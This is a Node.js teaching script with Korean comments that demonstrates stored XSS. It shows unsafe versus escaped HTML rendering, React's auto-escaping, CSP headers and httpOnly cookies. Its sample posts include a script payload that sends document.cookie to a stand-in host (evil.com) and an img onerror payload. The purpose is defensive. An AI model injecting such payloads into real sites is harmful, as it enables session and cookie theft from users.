/**
 * XSS (Cross-Site Scripting) 원리 데모
 * 실행: node xss-demo.js
 *
 * 브라우저에서 실행되는 공격이지만, 원리를 서버 측에서 이해한다.
 */

console.log("=== XSS 공격 원리 데모 ===\n");

// ============================================
// 1. Stored XSS — 가장 위험
// ============================================
console.log("=== 1. Stored XSS ===\n");

// 게시판에 글을 저장한다고 가정
const posts = [];

function addPost(title, content) {
  posts.push({ title, content });
}

function renderPostUnsafe(post) {
  // 위험: 사용자 입력을 그대로 HTML에 삽입
  return `<div class="post">
    <h2>${post.title}</h2>
    <p>${post.content}</p>
  </div>`;
}

function renderPostSafe(post) {
  // 안전: HTML 특수문자를 이스케이프
  return `<div class="post">
    <h2>${escapeHtml(post.title)}</h2>
    <p>${escapeHtml(post.content)}</p>
  </div>`;
}

function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// 공격자가 게시글을 작성
addPost(
  '일반적인 제목',
  '<script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>'
);

addPost(
  '<img src=x onerror="alert(document.cookie)">',
  '이미지 태그를 이용한 공격'
);

console.log("공격자가 작성한 게시글들:\n");

for (const post of posts) {
  console.log("--- 이스케이프 없이 (위험) ---");
  console.log(renderPostUnsafe(post));
  console.log("→ 브라우저가 스크립트를 실행함!\n");

  console.log("--- 이스케이프 적용 (안전) ---");
  console.log(renderPostSafe(post));
  console.log("→ 스크립트가 텍스트로 표시됨 (실행 안 됨)\n");
}

// ============================================
// 2. React의 자동 방어
// ============================================
console.log("=== 2. React의 XSS 방어 ===\n");

console.log("React JSX는 기본적으로 이스케이프를 적용한다:");
console.log("");
console.log("  // 안전 (자동 이스케이프)");
console.log("  <p>{userInput}</p>");
console.log("");
console.log("  // 위험! 이스케이프를 우회 (절대 쓰지 마라)");
console.log('  <p dangerouslySetInnerHTML={{ __html: userInput }} />');
console.log("");
console.log("AI가 dangerouslySetInnerHTML을 제안하면 → 거부하라.");
console.log("");

// ============================================
// 3. Content-Security-Policy
// ============================================
console.log("=== 3. CSP 헤더로 2차 방어 ===\n");

console.log("서버 응답에 CSP 헤더를 추가하면,");
console.log("인라인 스크립트와 외부 스크립트 로딩을 차단할 수 있다:\n");
console.log("  Content-Security-Policy: default-src 'self'; script-src 'self'");
console.log("");
console.log("  → <script>alert(1)</script> 실행 차단");
console.log("  → <script src='https://evil.com/bad.js'> 로딩 차단");
console.log("  → 같은 출처(self)의 스크립트만 허용");

console.log("\n=== 핵심 정리 ===");
console.log("1. 사용자 입력을 HTML에 삽입할 때 반드시 이스케이프");
console.log("2. React 등 프레임워크의 자동 이스케이프를 신뢰하되,");
console.log("   dangerouslySetInnerHTML은 절대 사용하지 마라");
console.log("3. CSP 헤더로 2차 방어선을 구축하라");
console.log("4. httpOnly 쿠키로 JS에서 쿠키 접근 자체를 차단하라");
